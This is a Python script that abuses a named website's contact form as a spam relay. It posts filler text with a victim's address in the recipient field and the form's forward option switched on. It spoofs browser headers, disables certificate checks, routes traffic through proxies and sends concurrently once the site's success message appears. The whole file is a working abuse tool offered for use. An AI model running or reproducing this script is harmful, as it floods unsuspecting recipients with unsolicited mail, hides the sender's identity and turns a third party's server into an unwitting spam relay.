headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Origin': 'http://www.sapienzacorse.it',
    'Pragma': 'no-cache',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://www.sapienzacorse.it/pages/contactform.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'contact_name': self.get_text(),
            'contact_address': target,
            'recipient': '0',
            'subject': '1',
            'contact_text': self.get_text(),
            'forward': 'on',
        }

        response = requests.post('http://www.sapienzacorse.it/pages/contactform.php', headers=headers, data=data,
                                 verify=False, proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = "Your message has been correctly sent."

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
